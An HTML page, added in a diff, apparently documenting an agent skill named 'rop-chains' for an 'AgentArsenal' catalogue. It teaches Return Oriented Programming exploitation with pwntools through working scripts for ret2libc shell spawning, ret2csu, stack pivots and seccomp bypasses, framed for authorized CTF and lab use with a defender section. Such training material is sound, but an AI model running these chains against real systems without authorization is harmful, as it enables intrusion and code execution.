@@ -1,0 +1,294 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>AgentArsenal: rop-chains</title>
+<style>
+:root {
+  --bg: #0d1117;
+  --panel: #161b22;
+  --border: #30363d;
+  --text: #e6edf3;
+  --muted: #8b949e;
+  --accent: #58a6ff;
+  --green: #3fb950;
+  --yellow: #d29922;
+  --red: #f85149;
+}
+* { box-sizing: border-box; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+  margin: 0;
+  line-height: 1.6;
+}
+.wrap { max-width: 1100px; margin: 0 auto; padding: 1.5rem; }
+header.site {
+  border-bottom: 1px solid var(--border);
+  background: var(--panel);
+}
+header.site .wrap { display: flex; align-items: center; gap: 1.5rem; flex-wrap: wrap; }
+header.site h1 { font-size: 1.25rem; margin: 0; }
+header.site h1 a { color: var(--text); text-decoration: none; }
+nav a { color: var(--accent); text-decoration: none; margin-right: 1rem; }
+nav a:hover { text-decoration: underline; }
+table { width: 100%; border-collapse: collapse; margin-top: 1rem; }
+th, td { border: 1px solid var(--border); padding: 0.55rem 0.75rem; text-align: left; vertical-align: top; }
+th { background: var(--panel); }
+tbody tr:hover { background: rgba(88, 166, 255, 0.06); }
+a { color: var(--accent); }
+.muted { color: var(--muted); }
+.badge {
+  display: inline-block;
+  padding: 0.12rem 0.6rem;
+  border-radius: 999px;
+  font-size: 0.8rem;
+  font-weight: 600;
+  white-space: nowrap;
+}
+.badge.green { background: rgba(63, 185, 80, 0.12); color: var(--green); border: 1px solid var(--green); }
+.badge.yellow { background: rgba(210, 153, 34, 0.12); color: var(--yellow); border: 1px solid var(--yellow); }
+.badge.red { background: rgba(248, 81, 73, 0.12); color: var(--red); border: 1px solid var(--red); }
+.badge.gray { background: rgba(139, 148, 158, 0.12); color: var(--muted); border: 1px solid var(--muted); }
+#filter {
+  width: 100%;
+  max-width: 28rem;
+  padding: 0.6rem 0.8rem;
+  margin-top: 1rem;
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  color: var(--text);
+  font-size: 1rem;
+}
+pre {
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 1rem;
+  overflow-x: auto;
+}
+code { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; font-size: 0.9em; }
+pre code { font-size: 0.85rem; }
+p code, li code, td code {
+  background: rgba(88, 166, 255, 0.1);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  padding: 0.05rem 0.35rem;
+}
+.meta { display: flex; gap: 0.75rem; flex-wrap: wrap; margin: 1rem 0; align-items: center; }
+.deps { margin: 0.5rem 0; }
+.deps span.kind { color: var(--muted); font-size: 0.85rem; margin-right: 0.4rem; }
+.deps a { margin-right: 0.5rem; }
+h2 { border-bottom: 1px solid var(--border); padding-bottom: 0.4rem; }
+footer { border-top: 1px solid var(--border); margin-top: 2rem; padding: 1rem 0; color: var(--muted); font-size: 0.85rem; }
+.legend { display: flex; gap: 1.5rem; flex-wrap: wrap; margin: 1rem 0; color: var(--muted); font-size: 0.9rem; }
+.legend svg { vertical-align: middle; margin-right: 0.4rem; }
+.graph-note { color: var(--muted); font-size: 0.9rem; }
+</style>
+</head>
+<body>
+<header class="site">
+<div class="wrap">
+<h1><a href="../index.html">AgentArsenal</a></h1>
+<nav>
+<a href="../index.html">Skills</a>
+<a href="../graph.html">Dependency graph</a>
+</nav>
+</div>
+</header>
+<main class="wrap">
+<p><a href="../index.html">&larr; All skills</a></p><h2>rop-chains</h2><div class="meta"><span class="badge gray">binary</span><span class="muted">v1.0.0</span><span class="badge green">stable</span><span class="badge green">100/100</span><span class="muted">verified 2026-10-23</span></div><p>Use when you need to build a Return Oriented Programming chain</p><div class="deps"><span class="kind">requires:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">extends:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">relates:</span> <a href="pwn-fundamentals.html">pwn-fundamentals</a> <a href="shellcode-basics.html">shellcode-basics</a></div><h2>Tools</h2><table><thead><tr><th>Tool</th><th>Version</th></tr></thead><tbody><tr><td>pwntools</td><td>4.13</td></tr><tr><td>ROPgadget</td><td>7.x</td></tr><tr><td>Ropper</td><td>1.13.x</td></tr><tr><td>GDB</td><td>15.x</td></tr></tbody></table><p>Return Oriented Programming builds an exploit out of the binary&#x27;s own code: short instruction sequences ending in <code>ret</code> (gadgets) are chained together on the stack so each <code>ret</code> jumps to the next gadget, letting you run arbitrary logic even when the stack is not executable. This skill covers the authorized workflow for finding gadgets and assembling chains, from simple ret2libc through ret2csu and stack pivots. It assumes you already control the instruction pointer (see pwn-fundamentals for getting there). All exploitation targets binaries you have written permission to test, such as CTF challenges or lab systems.</p>
+<h2>Quick Workflow</h2>
+<ol>
+<li>Confirm NX is enabled and list the binary&#x27;s protections so you know</li>
+<p>ROP is required.</p>
+<li>Hunt for gadgets in the binary with ROPgadget or Ropper; fall back to</li>
+<p>libc gadgets if the binary is small.</p>
+<li>Build the chain with pwntools ROP: set up arguments with pop gadgets,</li>
+<p>call the target function.</p>
+<li>Handle the 16-byte stack alignment requirement on 64-bit with a spare</li>
+<p><code>ret</code> gadget.</p>
+<li>If the overflow buffer is too small for the chain, pivot the stack to</li>
+<p>a larger controlled buffer.</p>
+<li>Test the chain locally under GDB, single-stepping through the first</li>
+<p>gadgets to verify register state.</p>
+<li>Adapt for remote: correct libc, correct base addresses, and retry</li>
+<p>logic.</p>
+</ol>
+<h2>1. Gadget hunting</h2>
+<p>A gadget is a few instructions ending in <code>ret</code>. The essential ones are <code>pop rdi; ret</code> (first argument), <code>pop rsi; ret</code> (second argument), and a plain <code>ret</code> (alignment).</p>
+<pre><code class="language-bash"># List all gadgets in the binary
+ROPgadget --binary ./vuln | head -40
+
+# Search for the specific gadgets you need
+ROPgadget --binary ./vuln --only &quot;pop|ret&quot; | grep -E &#x27;pop rdi|pop rsi|ret$&#x27;
+
+# Ropper alternative with quality scoring
+ropper --file ./vuln --search &quot;pop rdi&quot;
+ropper --file ./vuln --search &quot;ret&quot;</code></pre>
+<p>Small binaries often lack <code>pop rsi; ret</code>. Options: use gadgets from libc (huge gadget supply once you leak libc base), or use the ret2csu technique below, which uses <code>__libc_csu_init</code> gadgets present in every dynamically linked binary.</p>
+<pre><code class="language-bash"># Gadgets inside libc (after you know which libc the target uses)
+ROPgadget --binary ./libc.so.6 --only &quot;pop|ret&quot; | grep &#x27;pop rdi&#x27;</code></pre>
+<p>In pwntools, the ROP object automates gadget search:</p>
+<pre><code class="language-python">from pwn import *
+exe = ELF(&#x27;./vuln&#x27;)
+rop = ROP(exe)
+print(rop.rdi)   # address of &#x27;pop rdi; ret&#x27; or similar
+print(rop.rsi)
+print(rop.ret)</code></pre>
+<h2>2. ret2libc: the standard chain</h2>
+<p>Goal: call <code>system(&quot;/bin/sh&quot;)</code> using libc, with ASLR defeated by a leak. This extends the leak pattern from pwn-fundamentals.</p>
+<pre><code class="language-python">#!/usr/bin/env python3
+from pwn import *
+
+exe = ELF(&#x27;./vuln&#x27;)
+libc = ELF(&#x27;./libc.so.6&#x27;)  # the REMOTE libc
+OFFSET = 72
+
+def leak_libc(p):
+    rop = ROP(exe)
+    payload = b&#x27;A&#x27; * OFFSET
+    payload += p64(rop.find_gadget([&#x27;pop rdi&#x27;, &#x27;ret&#x27;])[0])
+    payload += p64(exe.got[&#x27;puts&#x27;])
+    payload += p64(exe.plt[&#x27;puts&#x27;])
+    payload += p64(exe.symbols[&#x27;main&#x27;])
+    p.sendline(payload)
+    p.recvline()
+    return u64(p.recvline().strip().ljust(8, b&#x27;\x00&#x27;))
+
+p = process(&#x27;./vuln&#x27;)
+puts_addr = leak_libc(p)
+libc.address = puts_addr - libc.symbols[&#x27;puts&#x27;]
+
+rop = ROP([exe, libc])
+rop.system(next(libc.search(b&#x27;/bin/sh&#x27;)))
+print(rop.dump())  # inspect the chain before sending
+
+payload = b&#x27;A&#x27; * OFFSET + rop.chain()
+p.sendline(payload)
+p.interactive()</code></pre>
+<p><code>rop.dump()</code> is your debugging friend: it prints each gadget address and value in order. Read it before sending; a misplaced value is obvious in the dump and invisible in a hex blob.</p>
+<h2>3. ret2csu: universal argument setup</h2>
+<p><code>__libc_csu_init</code> contains two gadgets that together set rbx, rbp, r12, r13, r14, r15 and then call a function pointer with rdi, rsi, rdx controlled. This works on any dynamically linked binary, even tiny ones with no <code>pop rsi</code> gadget.</p>
+<pre><code class="language-bash"># Find the csu gadgets
+objdump -d ./vuln | grep -A20 &#x27;&lt;__libc_csu_init&gt;:&#x27;
+# Look for:
+#   pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
+#   mov rdx,r15; mov rsi,r14; mov edi,r13d; call [r12+rbx*8]</code></pre>
+<pre><code class="language-python"># ret2csu chain calling write(1, got_puts, 8) to leak an address
+csu_pop = 0x4006aa   # pop rbx,rbp,r12,r13,r14,r15; ret
+csu_call = 0x400690  # mov rdx,r15; mov rsi,r14; mov edi,r13d; call [r12+rbx*8]
+
+payload = b&#x27;A&#x27; * OFFSET
+payload += p64(csu_pop)
+payload += p64(0)              # rbx = 0 (index into the call table)
+payload += p64(1)              # rbp = 1 (loop runs once: rbx != rbp)
+payload += p64(exe.got[&#x27;write&#x27;])  # r12 -&gt; address of function pointer
+payload += p64(1)              # r13 -&gt; rdi = fd 1 (stdout)
+payload += p64(exe.got[&#x27;puts&#x27;])   # r14 -&gt; rsi = buffer to leak
+payload += p64(8)              # r15 -&gt; rdx = length
+payload += p64(csu_call)
+payload += b&#x27;A&#x27; * 56           # padding the call gadget consumes
+payload += p64(exe.symbols[&#x27;main&#x27;])</code></pre>
+<p>The 56 bytes of padding account for the six popped registers plus the return slot the call gadget sequence consumes. Get this wrong and the chain desynchronizes; verify in GDB by watching RSP at each step.</p>
+<h2>4. Stack pivoting</h2>
+<p>When the overflow buffer holds fewer bytes than your chain needs, move the stack pointer to a bigger buffer you control (often the BSS).</p>
+<pre><code class="language-bash"># Find a stack pivot gadget: xchg rsp, rax / mov rsp, rbp / leave; ret
+ROPgadget --binary ./vuln --only &quot;xchg|mov|leave&quot; | grep -E &#x27;rsp&#x27; | head</code></pre>
+<p>The classic pivot: overflow a small buffer to overwrite RBP, then a <code>leave; ret</code> (<code>mov rsp, rbp; pop rbp; ret</code>) moves the stack to a fake frame you placed in BSS via an earlier read.</p>
+<pre><code class="language-python"># Two-stage pivot: first read the real chain into BSS, then pivot to it
+bss = exe.bss() + 0x100
+
+# Stage 1: read(0, bss, 0x400) then pivot
+rop = ROP(exe)
+rop.read(0, bss, 0x400)
+# then a leave;ret with rbp pointing at the fake frame
+payload = b&#x27;A&#x27; * OFFSET
+payload += p64(rop.find_gadget([&#x27;pop rbp&#x27;, &#x27;ret&#x27;])[0])
+payload += p64(bss - 8)       # rbp points just below the fake frame
+payload += p64(exe.symbols[&#x27;leave_ret&#x27;])  # or find &#x27;leave; ret&#x27;
+p.sendline(payload)
+
+# Stage 2: send the real ROP chain, which now executes from BSS
+rop2 = ROP([exe, libc])
+rop2.system(next(libc.search(b&#x27;/bin/sh&#x27;)))
+p.sendline(rop2.chain())
+p.interactive()</code></pre>
+<h2>5. Bad characters</h2>
+<p>If input passes through <code>strcpy</code> or a filter, bytes like <code>0x00</code>, <code>0x0a</code>, or <code>0x20</code> may terminate or corrupt the payload. Detect and route around them.</p>
+<pre><code class="language-python"># Test which bytes survive: send all 256 and see what comes back
+# (adapt to the binary&#x27;s echo or leak behavior)
+for i in range(256):
+    p = process(&#x27;./vuln&#x27;)
+    p.send(bytes([i]) * 8)
+    # observe truncation or transformation</code></pre>
+<p>Workarounds:</p>
+<ul>
+<li>Pick gadgets whose addresses avoid bad bytes (search libc for</li>
+<p>alternative gadgets at clean addresses).</p>
+<li>Build forbidden values arithmetically: load a nearby clean value and</li>
+<p>adjust with <code>add</code> gadgets.</p>
+<li>For <code>/bin/sh</code> with a null-byte filter, write it to memory in two</li>
+<p>halves with <code>mov</code> gadgets instead of embedding the string.</p>
+<li>If <code>0x0a</code> (newline) terminates input via <code>fgets</code>, keep every payload</li>
+<p>byte free of newlines, or switch to a <code>read</code>-based input path.</p>
+</ul>
+<h2>6. Debugging chains in GDB</h2>
+<pre><code class="language-bash">gdb -q ./vuln
+# (gdb) break *main
+# (gdb) run &lt; payload.txt
+# Step through the chain:
+# (gdb) break *0x4006aa   # first gadget
+# (gdb) continue
+# (gdb) info registers rdi rsi rdx rsp
+# (gdb) x/8gx $rsp         # inspect the upcoming chain on the stack</code></pre>
+<p>Checklist at each gadget: are the argument registers correct, does RSP point at the next gadget address, and is the stack 16-byte aligned before each <code>call</code>. Most mysterious crashes are alignment or a wrong gadget address, both visible in this inspection.</p>
+<p>pwntools GDB integration attaches automatically:</p>
+<pre><code class="language-python">p = process(&#x27;./vuln&#x27;)
+gdb.attach(p, gdbscript=&#x27;break *main\ncontinue&#x27;)</code></pre>
+<h2>Edge cases</h2>
+<ul>
+<li>No <code>pop rdi</code> in the binary and no libc leak yet: use ret2csu, which</li>
+<p>needs no pop gadgets at all.</p>
+<li>The binary is statically linked: gadget supply is enormous (the</li>
+<p>whole libc is inside), but addresses shift with every build. Leak or brute-force as needed.</p>
+<li>Gadget addresses contain bad bytes: search for equivalent gadgets</li>
+<p>at different addresses; libc usually has dozens of <code>pop rdi</code> variants.</p>
+<li>The chain works locally but not remotely: the number one cause is a</li>
+<p>wrong libc file. Verify with the leak: the leaked address minus the local libc symbol must equal the remote base you assume.</p>
+<li>seccomp filters block execve: ROP can still read the flag with</li>
+<p><code>open</code>/<code>read</code>/<code>write</code> chains (an ORW chain). Check seccomp with <code>seccomp-tools dump ./vuln</code> if available.</p>
+<li>Stack alignment faults inside libc functions: prepend a <code>ret</code></li>
+<p>gadget before every libc call on 64-bit.</p>
+</ul>
+<h2>Escalation</h2>
+<ul>
+<li>ROP is impossible because the binary has almost no gadgets (tiny</li>
+<p>static binary): consider Sigreturn Oriented Programming (SROP), which needs only one <code>syscall; ret</code> gadget and builds a fake signal frame to set all registers at once.</p>
+<li>You need more complex logic than a linear chain: chain into a</li>
+<p><code>mprotect</code> call to make a memory region executable, then jump to shellcode there (see shellcode-basics). This is the standard ROP-to-shellcode escalation.</p>
+<li>The target has Control Flow Integrity or CET: classic ROP dies.</li>
+<p>These mitigations are rare in CTF but common in hardened production; document the mitigation as effective and look for logic bugs instead.</p>
+<li>Time is short: pwntools <code>ROP</code> with <code>rop.call()</code> and <code>rop.dump()</code></li>
+<p>builds correct chains faster than hand-assembling gadgets. Trust the tooling and verify with the dump.</p>
+</ul>
+<h2>Detection and defender view</h2>
+<p>Defenders detect ROP through control-flow integrity violations, hardware CET faults, and behavioral monitoring (a network service crashing repeatedly, then spawning a shell). The durable mitigations are compiler-level: CET and shadow stacks, control-flow integrity (CFI), and full RELRO with PIE so gadget addresses are unknowable. Address space randomization raises the bar from one leak to a full chain. For code review, the fix is the same as for any memory bug: eliminate the initial overflow, because ROP is only the payload after the vulnerability.</p>
+<h2>Key references</h2>
+<ul>
+<li>CWE-121 (Stack-based Buffer Overflow): the entry vulnerability.</li>
+<li>CWE-787 (Out-of-bounds Write).</li>
+<li>MITRE ATT&amp;CK T1068 (Exploitation for Privilege Escalation).</li>
+<li>ROPgadget documentation: https://github.com/JonathanSalwan/ROPgadget</li>
+<li>Ropper documentation: https://github.com/sashs/Ropper</li>
+<li>pwntools ROP documentation: https://docs.pwntools.com/en/stable/rop/rop.html</li>
+</ul>
+</main>
+<footer class="wrap">
+<p>AgentArsenal docs. Generated 2026-10-23.</p>
+</footer>
+</body>
+</html>
